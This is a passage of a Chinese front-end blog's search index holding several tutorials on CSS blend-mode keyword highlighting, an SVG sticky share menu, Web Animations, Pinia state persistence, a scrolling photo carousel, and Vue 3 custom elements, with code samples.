在商业智能（BI）应用程序中表现良好，更适合需要快速读/写速度的数据分析和数据仓库应用程序，因此，它也适用于 OLTP/OLAP 系统； 可以在单个产品中存储结构化和非结构化数据类型，它支持大多数数据类型，比如对 JSON 的支持。多年来 PostgreSQL 的最大创新之一是在其 PostgreSQL 9.2 中引入了生成 JSON 数据功能。 另外，云计算公司 Joyent 的解决方案工程总监 Elijah Zupancic 也提到了文档的重要性，“从开发的角度来看，使用它是一种乐趣，其文档很精彩，数据类型反映了开发人员的工作类型。” 参考资料 再见，下坠的 MySQL！ ","link":"https://zkrisj.github.io/post/jin-ji-de-postgresqlxia-zhui-de-mysql/"},{"title":"使用 mix-blend-mode 实现不套标签搜索关键字高亮","content":"mix-blend-mode 一般实现是文字搜索高亮，需要动态给文字内容套一层标签，然后才能改变匹配文字的颜色。现在，通过 mix-blend-mode 混合模式，我们可以在不嵌套任何标签的情况下，让任意的文字颜色变色。 mix-blend-mode CSS 属性设置元素的内容与元素的背景或元素的直系父元素的内容如何混合。它的取值数据类型为 &lt;blend-mode&gt;，描述当元素重叠时，颜色应当如何呈现。 当层重叠时，采用前景和背景的颜色值，执行其混合模式计算并返回最终的颜色值。 &lt;blend-mode&gt; = normal | 最终颜色都是顶层颜色，无论底层颜色是什么。 multiply | 最终颜色是顶层和底层颜色相乘叠加的结果。 screen | 最终的颜色是反转顶层颜色和底层颜色，将反转后的两个颜色相乘，再反转得到结果。 overlay | 如果底层颜色比顶层颜色深，则最终颜色是 multiply 的结果； 如果底层颜色比顶层颜色浅，则最终颜色是 screen 的结果。 适合实现文字水印效果。 darken | 最终颜色由两层颜色中每个颜色通道的最暗值所组成的颜色。 lighten | 最终颜色由两层颜色中每个颜色通道的最亮值所组成的颜色。 color-dodge | 最终颜色是将底层颜色除以顶层颜色的反色的结果。 可以用来保护底图的高光，适合处理高光下的人物照片。 color-burn | 最终颜色是反转底色并将值除以顶色然后反转该值的结果。 和特定的色彩进行混合，可以营造更加幽深的意境。 hard-light | 如果顶层颜色比底层颜色深，则最终颜色是 multiply 的结果； 如果顶层颜色比底层颜色浅，则最终颜色是 screen 的结果。 相当于 overlay 两层颠倒的结果。 好像耀眼的聚光灯照射过来，表现为图像亮的地方更亮，暗的地方更暗。 soft-light | 最终颜色类似于 hard-light 的结果，但更加柔和一些。 好像发散的光源弥漫过来，给图像着色的时候常用此混合模式。 difference | 最终颜色是 两种颜色中较浅的颜色 减去 两种颜色中较深的颜色 得到的结果。 黑色层不会造成变化，而白色层会反转另一层的颜色。 可以实现颜色的反色效果。 exclusion | 最终颜色类似于 difference，但对比度更低一些。 hue | 最终颜色具有顶层颜色的色调，同时使用底层颜色的饱和度和亮度。 saturation | 最终颜色具有顶层颜色的饱和度，同时使用底层颜色的色调和亮度。 饱和度为零的纯灰色背景层不会造成变化。 color | 最终颜色具有顶层颜色的色调和饱和度，同时使用底层颜色的亮度。 该效果保留了灰度，可用于为前景着色。 luminosity | 最终颜色具有顶层颜色的亮度，同时使用底层颜色的色调和饱和度。 相当于 color 模式两层颠倒的结果。 原理 绑定输入事件。 获取输入的关键字和其文本长度。 将原文文本根据关键字拆分成数组并遍历。 对每个拆分子项创建一个 Range 文档片段，设置起始位置为原文文本节点，偏移量为当前子项的长度；设置结束位置为原文文本节点，偏移量为当前子项的长度 + 关键字文本长度。 获取每个拆分子项的 DOMRect 对象，它包含了 Range 中所有元素组成的矩形边界的信息。 对每个拆分子项创建一个对应浮层元素，设置绝对定位，左边界为当前 DOMRect 对象的左坐标值，上边界为当前 DOMRect 对象的顶坐标值 + 文档在垂直方向已滚动的像素值，宽高为为当前 DOMRect 对象的宽高。设置浮层元素 mix-blend-mode: overlay。 HTML 代码如下： &lt;input id=&quot;search&quot; type=&quot;search&quot; placeholder=&quot;输入内容搜索&quot;&gt; &lt;h6 id=&quot;target&quot;&gt; 上面输入框可以输入任意这段内容中出现的文字或者单词，就会看到文字有高亮效果。但是，这种高亮效果既不是文字选中，也不是通过包裹标签元素实现的，而是直接覆盖在上面，然后通过叠加混合模式实现的。值 overlay 叠加混合模式适合浅色文字，如果是深色文字，可以使用 lighten；如果要高亮背景，可以使用 difference。 &lt;/h6&gt; CSS 代码如下： ui-overlay { position: absolute; background: red; mix-blend-mode: overlay; } [id] { background: white; color: gray; } JS 代码如下： search.addEventListener('input', e =&gt; { document.querySelectorAll('ui-overlay').forEach(overlay =&gt; overlay.remove()); const value = this.value.trim(); const { length } = value; if (!length) return; const arrMatchs = target.textContent.split(value); if (arrMatchs.length &gt; 1) { let start = 0; arrMatchs.forEach((parts, index) =&gt; { if (index === arrMatchs.length - 1) return; const range = document.createRange(); start += parts.length; range.setStart(target.firstChild, start); range.setEnd(target.firstChild, start + length); const bound = range.getBoundingClientRect(); const eleOverlay = document.createElement('ui-overlay'); document.body.appendChild(eleOverlay); eleOverlay.style.left = bound.left + 'px'; eleOverlay.style.top = (bound.top + window.pageYOffset) + 'px'; eleOverlay.style.width = bound.width + 'px'; eleOverlay.style.height = bound.height + 'px'; start += length; }); } }); 改进 上面的搜索原文只能为文本节点，如果原文嵌套了标签，则无法高亮。所以需要递归遍历原文所有子节点： function getNodeAndOffset(wrap_dom, start = 0, end = 0) { const txtList = []; // 递归遍历，提取出所有 #text (function map(childNodes) { [...childNodes].forEach(el =&gt; el.nodeName === '#text' ? txtList.push(el) : map(el.childNodes)); })(wrap_dom.childNodes); // 计算文本的位置区间 [0,3]、[3, 8]、[8,10] const clips = txtList.reduce((arr, item, index) =&gt; { const end = item.textContent.length + (arr[index - 1] ? arr[index - 1][2] : 0); arr.push([item, end - item.textContent.length, end]); return arr; }, []); // 查找满足条件的范围区间 const startNode = clips.find(el =&gt; start &gt;= el[1] &amp;&amp; start &lt; el[2]); const endNode = clips.find(el =&gt; end &gt;= el[1] &amp;&amp; end &lt; el[2]); return [startNode[0], start - startNode[1], endNode[0], end - endNode[1]]; } 然后设置每个拆分子项对应的 Range 文档片段的起始位置、结束位置、偏移量： const nodes = getNodeAndOffset(target, start, start + length); range.setStart(nodes[0], nodes[1]); range.setEnd(nodes[2], nodes[3]); 马上掘金 ","link":"https://zkrisj.github.io/post/shi-yong-mix-blend-mode-shi-xian-bu-tao-biao-qian-sou-suo-guan-jian-zi-gao-liang/"},{"title":"SVG 实现分享菜单按钮的粘滞融合效果","content":"介绍 CSS filter 属性用于将模糊或颜色偏移等图形效果应用于元素。CSS 标准里包含了一些已实现预定义效果的函数（blur、brightness、contrast、drop-shadow、grayscale、hue-rotate、invert、opacity、saturate、sepia）。但也可以引用一个 SVG 滤镜，通过一个 URL 链接到 SVG 的 filter 滤镜元素。 效果 点击分享按钮，弹出常见的社交分享按钮，然后相互间粘滞，同时分享按钮还会抖动动画。 HTML 如下： &lt;input type=&quot;checkbox&quot; id=&quot;share&quot;&gt; &lt;div class=&quot;target&quot;&gt; &lt;label class=&quot;share&quot; for=&quot;share&quot;&gt;分享&lt;/label&gt; &lt;span class=&quot;icon-share-weibo&quot;&gt;&lt;img src=&quot;weibo.png&quot;&gt;&lt;/span&gt; &lt;span class=&quot;icon-share-wechat&quot;&gt;&lt;img src=&quot;wechat.png&quot;&gt;&lt;/span&gt; &lt;span class=&quot;icon-share-qq&quot;&gt;&lt;img src=&quot;qq.png&quot;&gt;&lt;/span&gt; &lt;/div&gt; 步骤 添加 SVG 滤镜： &lt;svg width=&quot;0&quot; height=&quot;0&quot; style=&quot;position:absolute;&quot;&gt; &lt;defs&gt; &lt;filter id=&quot;goo&quot;&gt; &lt;feGaussianBlur in=&quot;SourceGraphic&quot; stdDeviation=&quot;10&quot; result=&quot;blur&quot; /&gt; &lt;feColorMatrix in=&quot;blur&quot; mode=&quot;matrix&quot; values=&quot;1 0 0 0 0 0 1 0 0 0 0 0 1 0 0 0 0 0 19 -9&quot; result=&quot;goo&quot; /&gt; &lt;feComposite in=&quot;SourceGraphic&quot; in2=&quot;goo&quot; operator=&quot;atop&quot;/&gt; &lt;/filter&gt; &lt;/defs&gt; &lt;/svg&gt; 原理： 先让图形高斯模糊； 再使用 feColorMatrix 滤镜增加 alpha 透明通道的对比度，于是可以把高斯模糊重合的部分进行合并，形成融合效果； 最后使用 feComposite 滤镜的 operator 属性的 atop 值让原始的图形在上面显示。 对于方形元素而言，其四角边缘因为高斯模糊而变弯了，于是使用 feColorMatrix 滤镜 alpha 通道增强的时候，四边的直角会变成圆角。 如果元素原本就是个正圆，则没有这个问题，融合效果最好，因为正圆的高斯模糊它是均匀的。 在需要粘滞融合的元素 CSS 中添加 transition 过渡属性。 [class*=&quot;icon-share-&quot;] { position: absolute; width: 48px; height: 48px; background-color: #cd0000; border-radius: 50%; transition: transform .5s; transform: scale(0.5); } 然后在需要粘滞融合元素的父元素 CSS 中通过一个 URL 链接到 SVG 的 filter 滤镜元素。 .target { filter: url(&quot;#goo&quot;); } 点击时将需要粘滞融合的元素使用 transform translate 函数转换位置。 :checked+.target .icon-share-weibo { transform: scale(1) translate(-70px, 60px); } :checked+.target .icon-share-wechat { transform: scale(1) translate(0, 75px); } :checked+.target .icon-share-qq { transform: scale(1) translate(70px, 60px); } 这里使用了 checkbox 的 checked 属性来切换展开和收起状态，而无需 JS 代码。 为了效果更佳灵动，我们还可以给分享按钮加一个小动画，我们可以从 animate.css 上找一个合适的 CSS3 动画效果，例如 jello，拷贝相关 CSS 代码，添加在分享按钮上。 :checked+.target .share { animation: jello 1s; } @keyframes jello { from, 11.1%, to { transform: none; } 22.2% { transform: skewX(-12.5deg) skewY(-12.5deg); } 33.3% { transform: skewX(6.25deg) skewY(6.25deg); } 44.4% { transform: skewX(-3.125deg) skewY(-3.125deg); } 55.5% { transform: skewX(1.5625deg) skewY(1.5625deg); } 66.6% { transform: skewX(-0.78125deg) skewY(-0.78125deg); } 77.7% { transform: skewX(0.390625deg) skewY(0.390625deg); } 88.8% { transform: skewX(-0.1953125deg) skewY(-0.1953125deg); } } 马上掘金 参考资料 HTML 元素粘滞融合效果 ","link":"https://zkrisj.github.io/post/svg-shi-xian-fen-xiang-cai-dan-an-niu-de-nian-zhi-rong-he-xiao-guo/"},{"title":"使用 Web Animations API 实现点击阅读更多动画","content":"介绍 Web Animations API 可以把 CSS3 实现的 animation 动画由 JS 代码实现。它通过组合两个模型来实现：时序模型（CSS transitions）和动画模型（CSS animations）。 Element.animate(keyframes, options) 用于在元素上创建和播放动画，返回创建的 Animation 对象实例。 keyframes 可以为任何css 动画属性 属性名称使用驼峰命名法指定，例如 background-color 变成 backgroundColor，background-position-x 变成 backgroundPositionX。也可以使用简写属性，例如 margin。 两个特殊的 css 属性： float, 必须写成 cssFloat ，因为 float 是 JavaScript 的关键字。 offset, 必须写成 cssOffset ，因为 offset 已经用来表示关键帧的偏移量。 还可以指定以下特殊属性： offset 关键帧的偏移量，介于 0.0 和 1.0 之间的数字或为 null。这相当于在 CSS 样式表中使用 @keyframes 以百分比指定开始和结束状态。如果为 null 或未指定，则关键帧将在相邻关键帧之间均匀分布。 easing 从当前 keyframe 到下一个 keyframe 所使用的 timing function。 composite 将 keyframe 中指定的值与基础值组合。 options 表示动画持续时间（以毫秒为单位）的整数，或包含以下一项或多项的对象： delay 延迟开始的毫秒数。默认为 0。 direction 动画的方向。默认为 normal，其他值包括：reverse，alternate，alternate-reverse。 duration 动画每次迭代完成所需的毫秒数。默认为 0。虽然这是可选的，但请记住，如果此值为 0，您的动画将不会运行。 easing 动画随时间变化的速率。接受预定义值 linear、ease、ease-in、ease-out 和 ease-in-out，或自定义 cubic-bezier 值，如 cubic-bezier( 0.42、0、0.58、1)。默认为 linear。 endDelay 动画结束后延迟的毫秒数。这主要用于根据另一个动画的结束时间对动画进行排序时使用。默认为 0。 fill 决定动画的效果是否应该先播放第一帧（backwards），在动画完成播放后保留最后一帧（forwards），或两者都有（both）。默认两者都不（none）。 iterationStart 描述动画应该在迭代中的哪个点开始。例如，0.5 表示在第一次迭代的中途开始，并且使用此值设置后，具有两次迭代的动画将在第三次迭代的中途结束。默认为 0.0。 iterations 动画重复的次数。默认为 1，也可以取 Infinity，使其在元素存在时重复。 iterationComposite 动画中如何迭代。可以设置为 accumulate 或 replace。默认 replace。 composite 如何在此动画和其他未指定其 composite 的单独动画之间组合。默认 replace，即用新值覆盖以前的值。其他值包括：add：例如 translateX(-200px) 和以前的 rotate(20deg) 会变成 translateX(-200px) rotate(20deg)；accumulate：例如 blur(2) 和 blur(5) 会变成 blur(7)。 效果如下： HTML &lt;div id=&quot;box&quot;&gt; &lt;div id=&quot;content&quot;&gt;Et netus et malesuada fames ac turpis egestas. Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas. Vestibulum tortor quam, feugiat vitae, ultricies eget, tempor sit amet, ante. Donec eu libero sit amet quam egestas semper. Aenean ultricies mi vitae est. Mauris placerat eleifend leo.&lt;/div&gt; &lt;div id=&quot;more&quot;&gt; &lt;span class=&quot;button&quot;&gt;阅读更多&lt;/span&gt; &lt;/div&gt; &lt;/div&gt; CSS .button { background: dodgerblue; padding: 5px 10px; border-radius: 8px; cursor: pointer; } .button:hover { background: deepskyblue; } #box { position: relative; width: 250px; height: 120px; padding: 20px; color: white; background-color: red; overflow: hidden; } #box #more { position: absolute; bottom: 0; left: 0; width: 100%; text-align: center; padding: 30px 0 20px 0; background-image: linear-gradient(rgba(255, 0, 0, 0), rgba(255, 0, 0, 100)); } JS function a(e) { const ani = box.animate({ height: ['120px', content.scrollHeight + 40 + 'px'] }, { duration: 200, fill: 'both' }); e.textContent = '收起'; a.b = true; } function s(e) { const ani = box.animate({ height: [content.scrollHeight + 40 + 'px', '120px'] }, { duration: 200, fill: 'both' }); e.textContent = '阅读更多'; a.b = false; } document.querySelector('.button').onclick=function(e) { a.b?s(this):a(this); } 马上掘金 ","link":"https://zkrisj.github.io/post/shi-yong-web-animations-api-shi-xian-dian-ji-yue-du-geng-duo-dong-hua/"},{"title":"Vue3 pinia-plugin-persistedstate Vite 插件的使用","content":"Pinia Vuex 用于管理和多个组件共享状态（数据源）。现在，Vue 的官方状态管理库已更改为 Pinia，它由 Vue 核心团队维护。Pinia 具有与 Vuex 5 几乎完全相同或增强的 API，在 Vuex 5 RFC 中进行了描述。可以简单地将 Pinia 视为具有不同名称的 Vuex 5（Pinia 也适用于 Vue 2.x）。Vue 官方推荐使用 Pinia： 更强的团队协作约定。 与 Vue DevTools 集成，包括时间轴、组件内部审查和时间旅行调试。 模块热更新 (HMR)。 服务端渲染支持。 即使在 JavaScript 中也具有类型，为 JS 用户提供适当的 TypeScript 支持或自动完成功能。 与 TypeScript 一起使用时具有可靠的类型推断支持。 pinia-plugin-persistedstate pinia-plugin-persistedstate 插件可以使 Pinia 存储的持久性变得更简单和可配置： 类似于 vuex-persistedstate 的 API。 单个 Store 的配置。 自定义存储方式和自定义序列化数据。 注水 hooks。 与 Vue 2 和 3 兼容。 没有外部依赖。 体积超小（&lt;1kB gzipped）。 示例 使用 npm create vite@latest 命令创建 vite 项目： Select a framework 选择 Vue； Select a variant 选择 Customize with create-vue； Add Pinia for state management? 选择 Yes。 安装后，在 src 下面会生成一个 stores 文件夹和一个 counter.js 示例文件。可以看到默认使用了 Composition API 写法，导出了一个响应属性 count、一个计算属性 doubleCount 和一个方法 increment。内容如下： import { ref, computed } from 'vue' import { defineStore } from 'pinia' export const useCounterStore = defineStore('counter', () =&gt; { const count = ref(0) const doubleCount = computed(() =&gt; count.value * 2) function increment() { count.value++ } return { count, doubleCount, increment } }) 将 App.vue 文件修改为以下即可引用 counter.js 中定义的 Store： &lt;template&gt; {{ countStore.count }} &lt;hr&gt; {{ countStore.doubleCount }} &lt;hr&gt; &lt;button @click=&quot;countStore.increment&quot;&gt;increment&lt;/button&gt; &lt;/template&gt; &lt;script setup&gt; import { useCounterStore } from &quot;./stores/counter&quot; const countStore = useCounterStore() &lt;/script&gt; &lt;style&gt; &lt;/style&gt; 当点击按钮时，响应属性 count 和计算属性 doubleCount 都会改变。但是，刷新页面后，它们都会恢复为 0，说明数据没有被持久化。 安装持久化插件： npm i pinia-plugin-persistedstate 修改 src/main.js 文件： import { createApp } from 'vue' import { createPinia } from 'pinia' import App from './App.vue' import piniaPluginPersistedstate from 'pinia-plugin-persistedstate' import './assets/main.css' const app = createApp(App) app.use(createPinia().use(piniaPluginPersistedstate)) app.mount('#app') 修改 counter.js 文件： import { ref, computed } from 'vue' import { defineStore } from 'pinia' export const useCounterStore = defineStore('counter', () =&gt; { const count = ref(0) const doubleCount = computed(() =&gt; count.value * 2) function increment() { count.value++ } return { count, doubleCount, increment } }, { persist: true, }) 当点击 increment 按钮时，响应属性 count 和计算属性 doubleCount 都会改变。刷新页面后可以看到，它们也都显示为刷新之前的数据，说明数据已经被持久化了。 插件预先配置了以下内容： localStorage 作为存储。 store.$id 作为存储的默认键，即 defineStore 的第一个参数。 JSON.stringify/JSON.parse 作为序列化器/反序列化器。 所有属性都会被持久化到本地存储中。 但是，可以将传递一个对象给 store 的 persist 属性来配置持久性。 import { stringify, parse } from 'zipson' persist: { key: 'my-custom-key', storage: sessionStorage, paths: ['count'], serializer: { deserialize: parse, serialize: stringify }, beforeRestore: (ctx) =&gt; { console.log(`about to restore '${ctx.store.$id}'`) }, afterRestore: (ctx) =&gt; { console.log(`just restored '${ctx.store.$id}'`) }, debug: true, }, key 用于引用存储中存储的反序列化数据的密钥。 storage 将数据持久保存到的存储类型。必须有 getItem: (key: string) =&gt; string | null 和 setItem: (key: string, value: string) =&gt; void 方法。 paths 持久化属性数组。 [] 表示没有状态被持久化， undefined 或 null 表示整个状态被持久化。 serializer 自定义序列化程序在持久化数据之前序列化数据，并在重新水化存储之前反序列化数据。必须同时有 serialize: (value: StateTree) =&gt; string 和 deserialize: (value: string) =&gt; StateTree 方法。 beforeRestore 钩子函数在恢复持久状态之前运行。该钩子可以访问整个 PiniaPluginContext。这可用于在水合之前强制执行特定操作。 afterRestore 钩子函数在恢复持久状态后运行。该钩子可以访问整个 PiniaPluginContext。这可用于在水合后强制执行特定操作。 debug 设置为 true 时，在持久化/水合存储时可能发生的任何错误都将记录为 console.error。 全局持久性配置：初始化插件时不使用 pinia-plugin-persistedstate 的默认导出项，而使用公开的 createPersistedState 方法使用全局选项初始化插件。这些选项成为应用内所有 Store 的新默认选项。修改 src/main.js 文件： import { createApp } from 'vue' import { createPinia } from 'pinia' import App from './App.vue' // import piniaPluginPersistedstate from 'pinia-plugin-persistedstate' import { createPersistedState } from 'pinia-plugin-persistedstate' import './assets/main.css' const app = createApp(App) // const pinia = createPinia().use(piniaPluginPersistedstate) const pinia = createPinia().use(createPersistedState({ storage: sessionStorage, paths: ['count', 'count2'], })) app.use(pinia) app.mount('#app') 这样，默认情况下，每个声明的 Store 中的 persist: true 配置都会将数据持久化到sessionStorage 中。但是传递给单个 Store 的 persist 配置的任何选项都可以覆盖其在全局选项中声明的对应项。可用的全局选项包括： storage serializer beforeRestore afterRestore 单个 Store 可以有多个持久性属性配置：可以将数据保存到不同的存储中，persist 选项可以接受一系列配置。 // src/stores/counter.js import { ref, computed } from 'vue' import { defineStore } from 'pinia' export const useCounterStore = defineStore('counter', () =&gt; { const count = ref(0) const count2 = ref(0) const doubleCount = computed(() =&gt; count.value * 2) function increment() { count.value++ count2.value++ } return { count, count2, doubleCount, increment } }, { // persist: true, persist: [ { paths: ['count'], storage: localStorage, }, { paths: ['count2'], storage: sessionStorage, }, ], }) 这样，count 值将被持久化到 localStorage，而 count2 值将被持久化到 sessionStorage。 GitHub 源码 vue3 pinia-plugin-persistedstate vite 插件的使用 ","link":"https://zkrisj.github.io/post/vue3-pinia-plugin-persistedstate-vite-cha-jian-de-shi-yong/"},{"title":"制作一个循环滚动的相册集","content":"介绍 效果如下： HTML 相册最后要补一个第一张图片的 img 元素，可以无缝循环。 &lt;div id=&quot;homeCarousel&quot;&gt; &lt;div id=&quot;homeCarouselWrap&quot;&gt; &lt;img src=&quot;https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/3a1c406fa6844c33aa2097917494e643~tplv-k3u1fbpfcp-watermark.image?&quot;&gt; &lt;img src=&quot;https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/d7898bd97e2449b5b72b76c114e84dfc~tplv-k3u1fbpfcp-watermark.image?&quot;&gt; &lt;img src=&quot;https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/d25a89459f264d3d860c4533bdef6a68~tplv-k3u1fbpfcp-watermark.image?&quot;&gt; &lt;img src=&quot;https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/3a1c406fa6844c33aa2097917494e643~tplv-k3u1fbpfcp-watermark.image?&quot;&gt; &lt;/div&gt; &lt;/div&gt; &lt;div id=&quot;modal&quot;&gt; &lt;span id=&quot;closeBtn&quot;&gt;×&lt;/span&gt; &lt;img id=&quot;img2&quot;&gt; &lt;/div&gt; CSS --s CSS 变量表示相册的图片数量（不包括最后一个补上的）。 --w CSS 变量表示相册的宽度。 :hover 伪类控制鼠标悬浮时，停止滚动。 animation 是 animation-name，animation-duration, animation-timing-function，animation-delay，animation-iteration-count，animation-direction，animation-fill-mode 和 animation-play-state 属性的一个简写形式。 animation: move calc(1s * var(--s)) linear infinite reverse; 的第二个参数表示 animation-duration，动画的时长，这里使用了 calc 函数，1 秒乘以相册中图片的数量；最后一个参数 animation-direction 的值 reverse 表示反向运行动画，每周期结束动画由尾到头运行。改成 normal，相册将从右向左循环滚动。 body { display: grid; place-items: center; height: 100vh; margin: 0; overflow: hidden; } #homeCarousel { width: 400px; height: 240px; line-height: 240px; overflow: hidden; border: solid rgba(0, 0, 0, 0.1); } #homeCarousel #homeCarouselWrap { display: flex; --w: 400; --s: 3; animation: move calc(1s * var(--s)) linear infinite reverse; } #homeCarousel #homeCarouselWrap&gt;img { flex-shrink: 0; width: 100%; height: 240px; cursor: pointer; vertical-align: middle; } @keyframes move { 0% { transform: translate(0, 0px); } 100% { transform: translate(calc(var(--s) * var(--w) * -1px), 0); } } #homeCarousel #homeCarouselWrap:hover { animation-play-state: paused; } #modal { position: fixed; z-index: 1; left: 0; top: -100%; width: 100%; height: 100%; overflow: auto; background-color: rgba(0, 0, 0, 0.9); transition-duration: 0.4s; text-align: center; } #img2 { width: 75%; max-height: 80%; } #closeBtn { position: absolute; top: 5%; right: 2.5%; color: white; font-size: 40px; font-weight: bold; cursor: pointer; } @media(max-width: 400px) { #closeBtn { top: 0; } } JS 添加鼠标事件，点击相册时预览当前图片。 homeCarousel.onclick = function(e) { if(e.target.tagName === 'IMG') { modal.style.top = 0; modal.style.paddingTop = '12%'; img2.src = e.target.src; } }; closeBtn.onclick = function() { modal.style.top = '-100%'; modal.style.paddingTop = 0; }; 马上掘金 ","link":"https://zkrisj.github.io/post/zhi-zuo-yi-ge-xun-huan-gun-dong-de-xiang-ce-ji/"},{"title":"Vue3 中使用 defineCustomElement 定义组件","content":"使用 Vue 构建自定义元素 Web Components 是一组 web 原生 API 的统称，允许开发者创建可复用的自定义元素 (custom elements)。 自定义元素的主要好处是，它们可以在使用任何框架，甚至是在不使用框架的场景下使用。当你面向的最终用户可能使用了不同的前端技术栈，或是当你希望将最终的应用与它使用的组件实现细节解耦时，它们会是理想的选择。 Vue 和 Web Components 是互补的技术，Vue 为使用和创建自定义元素提供了出色的支持。你可以将自定义元素集成到现有的 Vue 应用中，或使用 Vue 来构建和分发自定义元素。 Vue 在 Custom Elements Everywhere 测试中取得了 100% 的分数。在 Vue 应用中使用自定义元素基本上与使用原生 HTML 元素的效果相同，但需要进行一些额外的配置才能工作： 跳过组件解析 默认情况下，Vue 会将任何非原生的 HTML 标签优先当作 Vue 组件处理，而将“渲染一个自定义元素”作为后备选项。这会在开发时导致 Vue 抛出一个“解析组件失败”的警告。 要让 Vue 知晓特定元素应该被视为自定义元素并跳过组件解析，我们可以指定 compilerOptions.isCustomElement 这个选项，设置在此选项对象上的值将会在浏览器内进行模板编译时使用，并会影响到所配置应用的所有组件。 另外也可以通过 compilerOptions 选项在每个组件的基础上覆盖这些选项（针对当前组件有更高的优先级）。 因为它是一个编译时选项，构建工具需要将配置传递给 @vue/compiler-dom： vue-loader：通过 compilerOptions loader 的选项传递。 // vue.config.js module.exports = { chainWebpack: config =&gt; { config.module .rule('vue') .use('vue-loader') .tap(options =&gt; ({ ...options, compilerOptions: { // 将所有带 ion- 的标签名都视为自定义元素 isCustomElement: tag =&gt; tag.startsWith('ion-') } })) } } vite：通过 @vitejs/plugin-vue 的选项传递。 // vite.config.js import vue from '@vitejs/plugin-vue' export default { plugins: [ vue({ template: { compilerOptions: { // 将所有带短横线的标签名都视为自定义元素 isCustomElement: (tag) =&gt; tag.includes('-') } } }) ] } 浏览器内编译时的配置。 // src/main.js // 仅在浏览器内编译时才会工作 const app = createApp(App) app.config.compilerOptions.isCustomElement = (tag) =&gt; tag.includes('-') 传递 DOM 属性 由于 DOM attribute 只能为字符串值，因此我们只能使用 DOM 对象的属性来传递复杂数据。当为自定义元素设置 props 时，Vue 3 将通过 in 操作符自动检查该属性是否已经存在于 DOM 对象上，并且在这个 key 存在时，更倾向于将值设置为一个 DOM 对象的属性。这意味着，在大多数情况下，如果自定义元素遵循推荐的最佳实践，你就不需要考虑这个问题。 然而，也会有一些特别的情况：必须将数据以一个 DOM 对象属性的方式传递，但该自定义元素无法正确地定义/反射这个属性 (因为 in 检查失败)。在这种情况下，你可以强制使用一个 v-bind 绑定、通过 .prop 修饰符来设置该 DOM 对象的属性： &lt;my-element :user.prop=&quot;{ name: 'jack' }&quot;&gt;&lt;/my-element&gt; &lt;!-- 等价简写 --&gt; &lt;my-element .user=&quot;{ name: 'jack' }&quot;&gt;&lt;/my-element&gt; defineCustomElement() Vue 提供了一个和定义一般 Vue 组件几乎完全一致的 defineCustomElement 方法来支持创建自定义元素。这个方法接收的参数和 defineComponent 完全相同。但它会返回一个继承自 HTMLElement 的原生自定义元素类的构造器（可以通过 customElements.define() 注册）。 function defineCustomElement( component: | (ComponentOptions &amp; { styles?: string[] }) | ComponentOptions['setup'] ): { new (props?: object): HTMLElement } 除了常规的组件选项，defineCustomElement() 还支持一个特别的选项 styles，它是一个内联 CSS 字符串的数组，所提供的 CSS 会被注入到该元素的 ShadowRoot 上。 &lt;my-vue-element&gt;&lt;/my-vue-element&gt; import { defineCustomElement } from 'vue' const MyVueElement = defineCustomElement({ // 这里是同平常一样的 Vue 组件选项 props: {}, emits: {}, template: `...`, // defineCustomElement 特有的：注入进 ShadowRoot 的 CSS styles: [`/* css */`] }) // 注册自定义元素之后，所有此页面中的 `&lt;my-vue-element&gt;` 标签都会被升级 customElements.define('my-vue-element', MyVueElement) // 也可以在注册之后实例化元素： document.body.appendChild( new MyVueElement({ // 初始化 props（可选） }) ) 如果这时控制台报错：\\color{red}{如果这时控制台报错：}如果这时控制台报错：Component provided template option but runtime compilation is not supported，在 vite.config.js 或 vue.config.js 中添加以下配置： resolve: { alias: { 'vue': 'vue/dist/vue.esm-bundler.js' } }, 生命周期 当该元素的 connectedCallback 初次调用时，一个 Vue 自定义元素会在内部挂载一个 Vue 组件实例到它的 ShadowRoot 上。 当此元素的 disconnectedCallback 被调用时，Vue 会在一个微任务后检查元素是否还留在文档中。 如果元素仍然在文档中，那么说明它是一次移动操作，组件实例将被保留； 如果该元素不再存在于文档中，那么说明这是一次移除操作，组件实例将被销毁。 Props 所有使用 props 选项声明了的 props 都会作为属性定义在该自定义元素上。Vue 会自动地、恰当地处理其作为 attribute 还是属性的反射。 attribute 总是根据需要反射为相应的属性类型。基础类型的属性值 (string，boolean 或 number) 会被反射为 attribute。 当它们被设为 attribute 时 (永远是字符串)，Vue 也会自动将以 Boolean 或 Number 类型声明的 prop 转换为所期望的类型。比如下面这样的 props 声明： props: { selected: Boolean, index: Number } 并以下面这样的方式使用自定义元素： &lt;my-element selected index=&quot;1&quot;&gt;&lt;/my-element&gt; 在组件中，selected 会被转换为 true (boolean 类型值) 而 index 会被转换为 1 (number 类型值)。 事件 emit 触发的事件都会通过以 CustomEvents 的形式从自定义元素上派发。 额外的事件参数 (payload) 将会被暴露为 CustomEvent 对象上的一个 detail 数组。 插槽 在一个组件中，插槽将会照常使用 &lt;slot&gt; 渲染。然而，当使用最终的元素时，它只接受原生插槽的语法，而不支持作用域插槽。 当传递具名插槽时，应使用 slot attribute 而不是 v-slot 指令： &lt;my-element&gt; &lt;div slot=&quot;named&quot;&gt;hello&lt;/div&gt; &lt;/my-element&gt; 依赖注入 Provide / Inject API 和相应的组合式 API 在 Vue 定义的自定义元素中都可以正常工作。 但是，依赖关系只在自定义元素之间起作用。例如一个 Vue 定义的自定义元素就无法注入一个由常规 Vue 组件所提供的属性。 将 SFC 编译为自定义元素 defineCustomElement 也可以搭配 Vue 单文件组件 (SFC) 使用。但是，根据默认的工具链配置，SFC 中的 &lt;style&gt; 在生产环境构建时仍然会被抽取和合并到一个单独的 CSS 文件中。当正在使用 SFC 编写自定义元素时，通常需要改为注入 &lt;style&gt; 标签到自定义元素的 ShadowRoot 上。 官方的 SFC 工具链支持以“自定义元素模式”导入 SFC (需要 @vitejs/plugin-vue@^1.4.0 或 vue-loader@^16.5.0)。一个以自定义元素模式加载的 SFC 将会内联其 &lt;style&gt; 标签为 CSS 字符串，并将其暴露为组件的 styles 选项。这会被 defineCustomElement 提取使用，并在初始化时注入到元素的 ShadowRoot 上。 要开启这个模式，将组件文件以 .ce.vue 结尾即可： // Example.ce.vue &lt;template&gt; &lt;h1&gt;Example.ce&lt;/h1&gt; &lt;/template&gt; &lt;script&gt; &lt;/script&gt; &lt;style&gt; h1 { color: red; } &lt;/style&gt; import { defineCustomElement } from 'vue' import Example from './Example.ce.vue' console.log(Example.styles) // 